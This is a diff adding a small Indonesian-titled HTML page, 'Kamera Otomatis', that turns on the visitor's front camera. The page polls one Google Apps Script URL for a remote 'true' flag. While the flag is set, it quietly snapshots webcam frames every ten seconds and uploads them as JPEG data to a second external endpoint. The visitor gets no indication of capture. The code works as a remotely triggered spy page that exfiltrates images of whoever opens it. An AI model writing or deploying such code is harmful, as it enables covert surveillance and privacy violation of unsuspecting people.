@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Kamera Otomatis</title>
+</head>
+<body>
+  <h2>Kamera Aktif</h2>
+  <video id="video" width="320" height="240" autoplay playsinline></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script>
+    let auto = false;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => video.srcObject = stream)
+      .catch(err => alert("Kamera error: " + err));
+
+    function checkRemote() {
+      fetch("https://script.google.com/macros/s/AKfycbwEZBBP8aThiINul7pqVySJZDpdG-eZ0ySttTzZvyivKK_XSH7TX-g_ed_4APgjCnVp/exec")
+        .then(res => res.text())
+        .then(status => {
+          auto = (status.trim() === "true");
+          console.log("Status: " + auto);
+        });
+    }
+
+    function autoCapture() {
+      if (!auto) return;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+
+      fetch("https://script.google.com/macros/s/AKfycbyvOljl7HksEi7tO-F8dUWsxQxISlEjVfKLByNG9XvAx1v8Xk618KgNM75PWYNl5wgWnA/exec", {
+        method: "POST",
+        body: JSON.stringify({ image: imageData }),
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(res => res.text())
+      .then(data => console.log("Upload response:", data))
+      .catch(err => console.error("Upload error:", err));
+    }
+
+    setInterval(checkRemote, 5000);
+    setInterval(autoCapture, 10000);
+  </script>
+</body>
+</html>
